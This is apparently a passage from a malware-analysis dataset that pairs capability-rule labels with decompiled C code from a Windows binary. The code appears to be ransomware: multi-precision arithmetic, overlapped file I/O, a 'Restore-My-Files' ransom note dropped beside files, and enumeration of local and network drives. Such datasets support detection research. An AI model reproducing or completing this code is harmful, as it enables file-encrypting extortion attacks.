do {\n                            if ((uVar3 & uVar8) != 0) break;\n                            if ((uVar3 >> 1 & uVar8) != 0) {\n                                uVar4 = uVar4 + 1;\n                                break;\n                            }\n                            if ((uVar3 >> 2 & uVar8) != 0) {\n                                uVar4 = uVar4 + 2;\n                                break;\n                            }\n                            if ((uVar3 >> 3 & uVar8) != 0) {\n                                uVar4 = uVar4 + 3;\n                                break;\n                            }\n                            uVar4 = uVar4 + 4;\n                            uVar3 = uVar3 >> 4;\n                        } while (uVar4 < 0x20);\n                        uVar4 = iVar6 * 0x20 - uVar4;\n                    }\n                    if (uVar4 < uVar7) {\n                        puVar1 = var_14h + -4 + var_18h * 4;\n                        *puVar1 = *puVar1 & (1 << (uVar4 - 1U & 0x1f)) - 1U;\n                    }\n                    if (0x1e < var_8h) {\n                        return -0xe;\n                    }\n                    var_8h = var_8h + 1;\n                    iVar5 = fcn.0040a4b0(&var_1ch, &var_28h);\n                } while (-1 < iVar5);\n                var_50h = &var_10h;\n                var_10h = 1;\n                var_58h = 1;\n                var_54h = 1;\n                iVar5 = fcn.0040a4b0(&var_1ch, &var_58h);\n            } while (iVar5 < 1);\n            iVar2 = fcn.0040ac10(&var_1ch, &var_1ch, &var_34h, arg_8h, &var_4ch);\n            iVar5 = var_14h;\n            iVar6 = var_44h;\n            if (iVar2 != 0) break;\n            iVar5 = fcn.0040a4b0(&var_1ch, &var_28h);\n            if ((iVar5 != 0) && (iVar5 = fcn.0040a470(&var_1ch, 1),  iVar5 != 0)) {\n                uVar8 = 1;\n                if (1 < var_4h) {\n                    while (iVar5 = fcn.0040a4b0(&var_1ch, &var_28h),  iVar5 != 0) {\n                        iVar2 = fcn.0040c540(&var_40h, &var_1ch, &var_1ch);\n                        iVar5 = var_14h;\n                        iVar6 = var_44h;\n                        if ((iVar2 != 0) ||\n                           (iVar2 = fcn.0040c360(&var_1ch, &var_40h, arg_8h),  iVar5 = var_14h,  iVar6 = var_44h, \n                           iVar2 != 0)) goto code_r0x0040d1f0;\n                        var_5ch = &var_10h;\n                        var_10h = 1;\n                        var_64h = 1;\n                        var_60h = 1;\n                        iVar5 = fcn.0040a4b0(&var_1ch, &var_64h);\n                        if ((iVar5 == 0) || (uVar8 = uVar8 + 1,  var_4h <= uVar8)) break;\n                    }\n                }\n                iVar5 = fcn.0040a4b0(&var_1ch, &var_28h);\n                if ((iVar5 != 0) || (iVar5 = fcn.0040a470(&var_1ch, 1),  iVar5 == 0)) {\n                    iVar2 = -0xe;\n                    iVar5 = var_14h;\n                    iVar6 = var_44h;\n                    break;\n                }\n            }\n            var_ch = var_ch + 1;\n            iVar5 = var_14h;\n            iVar6 = var_44h;\n        } while (var_ch < arg_ch);\n    }\ncode_r0x0040d1f0:\n    if (ptr != 0) {\n        fcn.0040ef10(ptr, var_24h << 2);\n        sub.msvcrt.dll_free(ptr);\n    }\n    if (var_2ch != 0) {\n        fcn.0040ef10(var_2ch, var_30h << 2);\n        sub.msvcrt.dll_free(var_2ch);\n    }\n    if (var_38h != 0) {\n        fcn.0040ef10(var_38h, var_3ch << 2);\n        sub.msvcrt.dll_free(var_38h);\n    }\n    if (iVar5 != 0) {\n        fcn.0040ef10(iVar5, var_18h << 2);\n        sub.msvcrt.dll_free(iVar5);\n    }\n    if (iVar6 != 0) {\n        fcn.0040ef10(iVar6, var_48h << 2);\n        sub.msvcrt.dll_free(iVar6);\n    }\n    return iVar2;\n}\n",
        "token_count": 2552
    },
    "004064c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004064c0(uint *lpFileName)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    bool bVar10;\n    uint var_230h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0xc0000000, 3, 0, 3, 0x50000000, 0);\n    if (iVar3 != -1) {\n        *0x415718 = (*_sym.imp.KERNEL32.dll_CreateIoCompletionPort)(iVar3, *0x415718, 0, *0x416028);\n        if (*0x415718 != -1) {\n            iVar4 = sub.msvcrt.dll_malloc(0x280);\n            if (iVar4 == 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n                return 0;\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(iVar3, iVar4 + 0x18);\n            if (iVar5 != 0) {\n                iVar5 = sub.msvcrt.dll_malloc(0x20000);\n                *(iVar4 + 0x234) = iVar5;\n                if (iVar5 != 0) {\n                    uVar8 = *(iVar4 + 0x18);\n                    uVar1 = *(iVar4 + 0x1c);\n                    bVar10 = (uVar8 | uVar1) == 0;\n                    if (bVar10) {\n                        var_8h = 0;\n                    }\n                    var_4h = !bVar10;\n                    if ((uVar8 >> 0x1f | uVar1 << 1 | var_4h | uVar1 >> 0x1f) == 0) {\n                        uVar6 = 0x10;\n                        iVar5 = 0;\n                    }\n                    else {\n                        uVar6 = 0xfffffff0;\n                        iVar5 = -1;\n                    }\n                    uVar7 = uVar8 + uVar6;\n                    *(iVar4 + 0x230) = 5;\n                    *(iVar4 + 8) = uVar7;\n                    uVar8 = uVar1 + iVar5 + CARRY4(uVar8, uVar6);\n                    *(iVar4 + 0x10) = 0;\n                    bVar10 = (uVar7 | uVar8) == 0;\n                    *(iVar4 + 0xc) = uVar8;\n                    if (bVar10) {\n                        var_10h = 0;\n                    }\n                    var_4h = 0;\n                    var_ch = !bVar10;\n                    if ((uVar7 >> 0x1f | uVar8 * 2 | var_ch | uVar8 >> 0x1f) == 0) {\n                        iVar5 = uVar7 - 0x10;\n                        uVar1 = -(uVar7 < 0x10);\n                    }\n                    else {\n                        iVar5 = uVar7 + 0x10;\n                        uVar1 = 0xffffffef < uVar7;\n                    }\n                    *(iVar4 + 0x1c) = uVar8 + uVar1;\n                    *(iVar4 + 0x18) = iVar5;\n                    fcn.00401000(iVar4 + 0x20, 0, 0x208);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpFileName);\n                    fcn.004013a0(iVar4 + 0x20, lpFileName, iVar5 * 2);\n                    *(iVar4 + 0x22c) = iVar3;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, *(iVar4 + 0x234), 0x20000, 0, iVar4);\n                    if ((iVar5 == 0) && (iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar5 != 0x3e5)) {\n                        sub.msvcrt.dll_free(*(iVar4 + 0x234));\n                        sub.msvcrt.dll_free(iVar4);\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n                        return 0;\n                    }\n                    puVar9 = &var_230h;\n                    for (iVar3 = 0x82; iVar3 != 0; iVar3 = iVar3 + -1) {\n                        *puVar9 = *lpFileName;\n                        lpFileName = lpFileName + 1;\n                        puVar9 = puVar9 + 1;\n                    }\n                    (*_sym.imp.SHLWAPI.dll_PathRemoveFileSpecW)(&var_230h);\n                    var_24h = 0x730025;\n                    var_20h = 0x25005c;\n                    var_1ch = 0x2e0053;\n                    var_18h = 0x780074;\n                    var_14h = 0x74;\n                    (*_sym.imp.USER32.dll_wsprintfW)(&var_230h, &var_24h, &var_230h, \"Restore-My-Files\");\n                    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(&var_230h, 0x40000000, 1, 0, 1, 0x50000000, 0);\n                    if (iVar3 != -1) {\n                        *0x415718 = (*_sym.imp.KERNEL32.dll_CreateIoCompletionPort)(iVar3, *0x415718, 0, *0x416028);\n                        if (*0x415718 != -1) {\n                            iVar4 = sub.msvcrt.dll_malloc(0x280);\n                            if (iVar4 != 0) {\n                                *(iVar4 + 0x230) = 4;\n                                *(iVar4 + 8) = 0;\n                                *(iVar4 + 0xc) = 0;\n                                *(iVar4 + 0x10) = 0;\n                                *(iVar4 + 0x22c) = iVar3;\n                                iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar3, *0x41571c, *0x416030, 0, iVar4);\n                                if ((iVar5 != 0) || (iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar5 == 0x3e5))\n                                goto code_r0x004067df;\n                            }\n                            sub.msvcrt.dll_free(iVar4);\n                        }\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n                    }\ncode_r0x004067df:\n                    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n                    LOCK();\n                    iVar3 = *0x41602c + 1;\n                    iVar4 = *0x41602c + 1;\n                    *0x41602c = iVar3;\n                    if (1000 < iVar4) {\n                        do {\n                            (*pcVar2)(1);\n                        } while (399 < *0x41602c);\n                    }\n                    return 1;\n                }\n            }\n            sub.msvcrt.dll_free(iVar4);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            return 0;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    return 0;\n}\n",
        "token_count": 1717
    },
    "004073b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004073b0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lpFileName;\n    uint lpPathName;\n    \n    (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x104, &lpPathName);\n    (*_sym.imp.KERNEL32.dll_GetTempFileNameW)(&lpPathName, 0, 0, &lpFileName);\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(&lpFileName, 0x40000000, 0, 0, 2, 0x80, 0);\n    if (iVar1 == -1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar2 == 5) {\n            return 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    return 0;\n}\n",
        "token_count": 199
    },
    "0040a670": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040a670(int32_t *arg_8h, uint *arg_ch, int32_t *arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint32_t *arg_8h_00;\n    int32_t iVar7;\n    ulong uVar8;\n    uint var_6ch;\n    uint var_68h;\n    uint *var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint32_t *var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint32_t *var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint32_t *var_14h;\n    uint32_t *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_1ch = &var_18h;\n    var_18h = 0;\n    var_24h = 1;\n    var_20h = 1;\n    iVar3 = fcn.0040a4b0(arg_14h, &var_24h);\n    if (iVar3 == 0) {\n        return 0xfffffff4;\n    }\n    arg_8h_00 = NULL;\n    var_30h = 1;\n    var_2ch = 0;\n    var_28h = 0;\n    var_3ch = 1;\n    var_38h = 0;\n    var_34h = 0;\n    var_60h = 1;\n    var_5ch = 0;\n    var_58h = 0;\n    var_48h = 1;\n    var_44h = 0;\n    var_40h = NULL;\n    var_54h = 1;\n    var_50h = 0;\n    var_4ch = NULL;\n    iVar3 = fcn.0040a3d0(arg_10h, arg_14h);\n    if (iVar3 < 0) {\n        if ((arg_8h != NULL) && (uVar4 = fcn.0040c220(arg_8h, 0),  uVar4 != 0)) {\n            return uVar4;\n        }\n        if ((arg_ch != NULL) && (uVar4 = fcn.0040a590(arg_ch, arg_10h),  uVar4 != 0)) {\n            return uVar4;\n        }\n        return 0;\n    }\n    uVar4 = fcn.0040a590(&var_30h, arg_10h);\n    if ((uVar4 == 0) && (uVar4 = fcn.0040a590(&var_3ch, arg_14h),  uVar4 == 0)) {\n        var_3ch = 1;\n        var_30h = 1;\n        uVar4 = fcn.0040baa0(&var_60h, arg_10h[1] + 2);\n        if ((uVar4 == 0) &&\n           (((uVar4 = fcn.0040c220(&var_60h, 0),  uVar4 == 0 && (uVar4 = fcn.0040baa0(&var_48h, 2),  uVar4 == 0)) &&\n            (uVar4 = fcn.0040baa0(&var_54h, 3),  arg_8h_00 = var_4ch,  uVar4 == 0)))) {\n            uVar4 = fcn.0040a370(&var_3ch);\n            if ((uVar4 & 0x1f) < 0x1f) {\n                iVar3 = 0x1f - (uVar4 & 0x1f);\n                var_18h = iVar3;\n                uVar4 = fcn.0040c820(&var_30h, iVar3);\n                arg_8h_00 = var_4ch;\n                if ((uVar4 != 0) || (uVar4 = fcn.0040c820(&var_3ch, iVar3),  arg_8h_00 = var_4ch,  uVar4 != 0))\n                goto code_r0x0040a84e;\n            }\n            else {\n                var_18h = 0;\n            }\n            var_4h = var_2ch - 1;\n            var_ch = var_38h - 1;\n            iVar7 = var_4h - var_ch;\n            iVar3 = iVar7 * 0x20;\n            uVar4 = fcn.0040c820(&var_3ch, iVar3);\n            arg_8h_00 = var_4ch;\n            if (uVar4 == 0) {\n                iVar5 = fcn.0040a4b0(&var_30h, &var_3ch);\n                while (-1 < iVar5) {\n                    piVar6 = var_58h + iVar7 * 4;\n                    *piVar6 = *piVar6 + 1;\n                    uVar4 = fcn.0040cb80(&var_30h, &var_30h, &var_3ch);\n                    arg_8h_00 = var_4ch;\n                    if (uVar4 != 0) goto code_r0x0040a84e;\n                    iVar5 = fcn.0040a4b0(&var_30h, &var_3ch);\n                }\n                uVar4 = fcn.0040c960(&var_3ch, iVar3);\n                arg_8h_00 = var_4ch;\n                if (uVar4 == 0) {\n                    if (var_ch < var_4h) {\n                        var_10h = var_34h + var_ch * 4;\n                        var_8h = iVar3 + -0x20;\n                        piVar6 = var_58h + -4 + iVar7 * 4;\n                        do {\n                            uVar4 = *(var_28h + var_4h * 4);\n                            var_14h = var_28h + var_4h * 4;\n                            uVar1 = *var_10h;\n                            if (((uVar4 < uVar1) && (uVar1 != 0)) && (uVar4 < uVar1)) {\n                                uVar8 = sub.ntdll.dll__aulldiv();\n                                iVar3 = uVar8;\n                                if (uVar8 >> 0x20 != 0) {\n                                    var_1ch = NULL;\n                                    goto code_r0x0040a9e0;\n                                }\n                            }\n                            else {\ncode_r0x0040a9e0:\n                                iVar3 = -1;\n                            }\n                            *piVar6 = iVar3 + 1;\n                            do {\n                                *piVar6 = *piVar6 + -1;\n                                uVar4 = fcn.0040c220(&var_48h, 0);\n                                if (uVar4 != 0) goto code_r0x0040a84e;\n                                if (var_ch != 0) {\n                                    uVar4 = var_10h[-1];\n                                }\n                                var_6ch = 1;\n                                var_68h = 1;\n                                *var_40h = uVar4;\n                                var_40h[1] = *var_10h;\n                                var_64h = &var_1ch;\n                                var_1ch = *piVar6;\n                                uVar4 = fcn.0040c540(&var_48h, &var_48h, &var_6ch);\n                                if ((uVar4 != 0) ||\n                                   (uVar4 = fcn.0040c220(&var_54h, 0),  arg_8h_00 = var_4ch,  uVar4 != 0))\n                                goto code_r0x0040a84e;\n                                if (1 < var_4h) {\n                                    uVar4 = *(var_28h + -8 + var_4h * 4);\n                                }\n                                *var_4ch = uVar4;\n                                if (var_4h == 0) {\n                                    uVar4 = 0;\n                                }\n                                else {\n                                    uVar4 = var_14h[-1];\n                                }\n                                var_4ch[1] = uVar4;\n                                var_4ch[2] = *var_14h;\n                                iVar3 = fcn.0040a4b0(&var_48h, &var_54h);\n                            } while (0 < iVar3);\n                            uVar4 = fcn.0040c500(&var_48h, &var_3ch, *piVar6);\n                            if (((uVar4 != 0) || (uVar4 = fcn.0040c820(&var_48h, var_8h),  uVar4 != 0)) ||\n                               (uVar4 = fcn.0040cb80(&var_30h, &var_30h, &var_48h),  uVar4 != 0)) goto code_r0x0040a84e;\n                            iVar3 = fcn.0040a470(&var_30h, 0);\n                            if (iVar3 < 0) {\n                                uVar4 = fcn.0040a590(&var_48h, &var_3ch);\n                                if (((uVar4 != 0) || (uVar4 = fcn.0040c820(&var_48h, var_8h),  uVar4 != 0)) ||\n                                   (uVar4 = fcn.0040a300(&var_30h, &var_30h, &var_48h),  uVar4 != 0))\n                                goto code_r0x0040a84e;\n                                *piVar6 = *piVar6 + -1;\n                            }\n                            piVar6 = piVar6 + -1;\n                            var_8h = var_8h + -0x20;\n                            var_4h = var_4h - 1;\n                        } while (var_ch < var_4h);\n                    }\n                    if (arg_8h != NULL) {\n                        uVar4 = fcn.0040a590(arg_8h, &var_60h);\n                        if (uVar4 != 0) goto code_r0x0040a84e;\n                        *arg_8h = *arg_10h * *arg_14h;\n                    }\n                    if ((arg_ch != NULL) && (uVar4 = fcn.0040c960(&var_30h, var_18h),  uVar4 == 0)) {\n                        var_30h = *arg_10h;\n                        uVar4 = fcn.0040a590(arg_ch, &var_30h);\n                        if ((uVar4 == 0) && (iVar3 = fcn.0040a470(arg_ch, 0),  iVar3 == 0)) {\n                            *arg_ch = 1;\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0040a84e:\n    iVar3 = var_28h;\n    if (var_28h != 0) {\n        fcn.0040ef10(var_28h, var_2ch << 2);\n        sub.msvcrt.dll_free(iVar3);\n    }\n    iVar3 = var_34h;\n    if (var_34h != 0) {\n        fcn.0040ef10(var_34h, var_38h << 2);\n        sub.msvcrt.dll_free(iVar3);\n    }\n    iVar3 = var_58h;\n    if (var_58h != 0) {\n        fcn.0040ef10(var_58h, var_5ch << 2);\n        sub.msvcrt.dll_free(iVar3);\n    }\n    puVar2 = var_40h;\n    if (var_40h != NULL) {\n        fcn.0040ef10(var_40h, var_44h << 2);\n        sub.msvcrt.dll_free(puVar2);\n    }\n    if (arg_8h_00 != NULL) {\n        fcn.0040ef10(arg_8h_00, var_50h << 2);\n        sub.msvcrt.dll_free(arg_8h_00);\n    }\n    return uVar4;\n}\n",
        "token_count": 2891
    },
    "00404752": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404764)\n// WARNING: Removing unreachable block (ram,0x00404754)\n\nulong fcn.00404752(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t unaff_ESI;\n    \n    puVar1 = cpuid_basic_info(0);\n    uVar2 = *puVar1;\n    uVar4 = puVar1[2];\n    if (3 < uVar2) {\n        uVar2 = 0;\n        do {\n            puVar1 = cpuid_Deterministic_Cache_Parameters_info(4);\n            uVar5 = puVar1[1];\n            uVar4 = *puVar1 & 0x1f;\n            if (uVar4 == 0) break;\n            if (uVar4 != 2) {\n                uVar4 = (uVar5 >> 0xc & 0x3ff) + 1;\n                uVar3 = *puVar1 >> 5 & 7;\n                if (4 < uVar3) {\n                    uVar3 = 4;\n                }\n                *(unaff_ESI + uVar3 * 4) = (puVar1[3] + 1) * ((uVar5 >> 0x16) + 1) * uVar4 * ((uVar5 & 0xfff) + 1);\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < 0x100);\n        uVar2 = *(unaff_ESI + 4);\n    }\n    return CONCAT44(uVar4, uVar2);\n}\n",
        "token_count": 389
    },
    "0040ba70": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040ba70(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    if (*(arg_8h + 4) << 5 <= arg_ch) {\n        return 0;\n    }\n    return *(*(arg_8h + 8) + (arg_ch >> 5) * 4) >> (arg_ch & 0x1f) & 1;\n}\n",
        "token_count": 94
    },
    "0040c820": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c820(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    int8_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    uVar6 = arg_ch >> 5;\n    iVar3 = fcn.0040a370(arg_8h);\n    uVar4 = iVar3 + arg_ch;\n    uVar5 = *(arg_8h + 4);\n    if (uVar5 << 5 < uVar4) {\n        uVar4 = ((uVar4 & 0x1f) != 0) + (uVar4 >> 5);\n        if (10000 < uVar4) {\n            return 0xfffffff0;\n        }\n        if (uVar5 < uVar4) {\n            iVar3 = sub.msvcrt.dll_calloc(uVar4, 4);\n            if (iVar3 == 0) {\n                return 0xfffffff0;\n            }\n            if (*(arg_8h + 8) != 0) {\n                fcn.004013a0(iVar3, *(arg_8h + 8), *(arg_8h + 4) << 2);\n                fcn.0040ef10(*(arg_8h + 8), *(arg_8h + 4) << 2);\n                sub.msvcrt.dll_free(*(arg_8h + 8));\n            }\n            *(arg_8h + 4) = uVar4;\n            *(arg_8h + 8) = iVar3;\n            uVar5 = uVar4;\n        }\n    }\n    if (uVar6 != 0) {\n        if (uVar6 < uVar5) {\n            iVar3 = (uVar5 - uVar6) * 4;\n            do {\n                iVar3 = iVar3 + -4;\n                *(*(arg_8h + 8) + -4 + uVar5 * 4) = *(iVar3 + *(arg_8h + 8));\n                uVar5 = uVar5 - 1;\n            } while (uVar6 < uVar5);\n        }\n        for (; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *(*(arg_8h + 8) + -4 + uVar5 * 4) = 0;\n        }\n    }\n    if (((arg_ch & 0x1f) != 0) && (uVar6 < *(arg_8h + 4))) {\n        iVar2 = arg_ch & 0x1f;\n        do {\n            uVar5 = *(*(arg_8h + 8) + uVar6 * 4);\n            *(*(arg_8h + 8) + uVar6 * 4) = uVar5 << iVar2;\n            puVar1 = *(arg_8h + 8) + uVar6 * 4;\n            *puVar1 = *puVar1 | var_4h;\n            uVar6 = uVar6 + 1;\n            var_4h = uVar5 >> (0x20U - iVar2 & 0x1f);\n        } while (uVar6 < *(arg_8h + 4));\n    }\n    return 0;\n}\n",
        "token_count": 764
    },
    "0040c960": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c960(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    uVar6 = *(arg_8h + 4);\n    uVar2 = arg_ch & 0x1f;\n    arg_ch = arg_ch >> 5;\n    if ((arg_ch <= uVar6) && ((arg_ch != uVar6 || (uVar2 == 0)))) {\n        if (arg_ch != 0) {\n            uVar3 = 0;\n            if (uVar6 != arg_ch) {\n                iVar5 = arg_ch * 4;\n                do {\n                    *(*(arg_8h + 8) + uVar3 * 4) = *(iVar5 + *(arg_8h + 8));\n                    uVar3 = uVar3 + 1;\n                    uVar6 = *(arg_8h + 4);\n                    iVar5 = iVar5 + 4;\n                } while (uVar3 < uVar6 - arg_ch);\n            }\n            if (uVar3 < uVar6) {\n                do {\n                    *(*(arg_8h + 8) + uVar3 * 4) = 0;\n                    uVar3 = uVar3 + 1;\n                    uVar6 = *(arg_8h + 4);\n                } while (uVar3 < uVar6);\n            }\n        }\n        if ((uVar2 != 0) && (uVar6 != 0)) {\n            do {\n                uVar3 = *(*(arg_8h + 8) + -4 + uVar6 * 4);\n                *(*(arg_8h + 8) + uVar6 * 4 + -4) = uVar3 >> uVar2;\n                puVar1 = *(arg_8h + 8) + -4 + uVar6 * 4;\n                *puVar1 = *puVar1 | var_4h;\n                var_4h = uVar3 << (0x20U - uVar2 & 0x1f);\n                uVar6 = uVar6 - 1;\n            } while (uVar6 != 0);\n        }\n        return 0;\n    }\n    uVar4 = fcn.0040c220(arg_8h, 0);\n    return uVar4;\n}\n",
        "token_count": 571
    },
    "00404850": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004049bf)\n// WARNING: Removing unreachable block (ram,0x00404994)\n// WARNING: Removing unreachable block (ram,0x00404888)\n// WARNING: Removing unreachable block (ram,0x00404879)\n\nvoid fcn.00404850(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint8_t in_XCR0;\n    uint32_t in_XMM6_Dd;\n    \n    if (*0x4156f0 < 0) {\n        uVar3 = ((in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000) ^ 0x200000;\n        *0x4156f0 = 0;\n        if (((((uVar3 & 0x200000) != 0) * 0x200000 ^ uVar3) >> 0x15 & 1) == 0) {\n            piVar1 = cpuid_basic_info(0);\n            *0x4156f0 = *piVar1;\n            if (*0x4156f0 != 0) {\n                iVar2 = cpuid_Version_info(1);\n                uVar4 = *(iVar2 + 8);\n                uVar3 = *(iVar2 + 0xc);\n                *0x4156f0 = 0;\n                if ((((((((uVar4 & 1) != 0) && ((uVar4 >> 0x17 & 1) != 0)) && (*0x4156f0 = 1,  (uVar4 >> 0xf & 1) != 0))\n                      && ((*0x4156f0 = 2,  (uVar4 >> 0x18 & 1) != 0 &&\n                          ((in_XMM6_Dd ^ in_XMM6_Dd ^ 0xd95a34be) == 0xd95a34be)))) && ((uVar4 >> 0x19 & 1) != 0)) &&\n                    ((((*0x4156f0 = 3,  (uVar4 >> 0x1a & 1) != 0 && (*0x4156f0 = 4,  (uVar3 & 1) != 0)) &&\n                      ((*0x4156f0 = 5,  (uVar3 >> 9 & 1) != 0 &&\n                       (((*0x4156f0 = 6,  (uVar3 >> 0x13 & 1) != 0 && (*0x4156f0 = 8,  (uVar3 >> 0x17 & 1) != 0)) &&\n                        (*0x4156f0 = 9,  (uVar3 >> 0x14 & 1) != 0)))))) &&\n                     ((*0x4156f0 = 10,  (uVar3 >> 0x1b & 1) != 0 && (*0x4156f0 = 10,  (in_XCR0 & 6) == 6)))))) &&\n                   (((uVar3 >> 0x1c & 1) != 0 &&\n                    ((*0x4156f0 = 0xb,  (uVar3 >> 1 & 1) != 0 && ((uVar3 >> 0x19 & 1) != 0)))))) {\n                    *0x4156f0 = 0xc;\n                    iVar2 = cpuid_Extended_Feature_Enumeration_info(7);\n                    uVar4 = *(iVar2 + 4);\n                    if (((((uVar4 >> 5 & 1) != 0) &&\n                         (((*0x4156f0 = 0xd,  (uVar3 >> 0xc & 1) != 0 && ((uVar3 >> 0x1d & 1) != 0)) &&\n                          ((uVar4 >> 3 & 1) != 0)))) &&\n                        ((((uVar4 >> 8 & 1) != 0 && (iVar2 = cpuid(0x80000001),  (*(iVar2 + 0xc) >> 5 & 1) != 0)) &&\n                         (*0x4156f0 = 0xe,  (uVar4 >> 0x10 & 1) != 0)))) &&\n                       ((((in_XCR0 & 0x60) == 0x60 && (*0x4156f0 = 0xf,  (uVar4 >> 0x11 & 1) != 0)) &&\n                        (((uVar4 >> 0x1e & 1) != 0 && (uVar4 < 0)))))) {\n                        *0x4156f0 = 0x10;\n                    }\n                }\n            }\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 1104
    },
    "00407ca0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00407ca0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    ulong *puVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_38h;\n    uint lpRootPathName;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    iVar7 = 0;\n    pcVar5 = _sym.imp.USER32.dll_wsprintfW;\n    do {\n        if ((var_ch >> (iVar7 & 0x1f) & 1) != 0) {\n            var_20h = 0x430025;\n            var_18h._0_2_ = 0;\n            var_1ch = 0x5c003a;\n            (*pcVar5)(&lpRootPathName, &var_20h, iVar7 + 0x41);\n            var_14h = 0x430025;\n            var_10h = 0x3a;\n            (*pcVar5)(&var_38h, &var_14h, iVar7 + 0x41);\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(&lpRootPathName);\n            var_4h = 0x200;\n            uVar2 = sub.msvcrt.dll_malloc(0x400);\n            iVar3 = sub.MPR.dll_WNetGetConnectionW(&var_38h, uVar2, &var_4h);\n            if (iVar3 == 0) {\n                (*_sym.imp.SHLWAPI.dll_PathRemoveBackslashW)();\n                pcVar6 = _sym.imp.KERNEL32.dll_CreateThread;\n                uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00408ee0, uVar2, 0, &var_8h);\n                *(*0x417060 * 4 + 0x416060) = uVar2;\n                *0x417060 = *0x417060 + 1;\n            }\n            else {\n                sub.msvcrt.dll_free(uVar2);\n                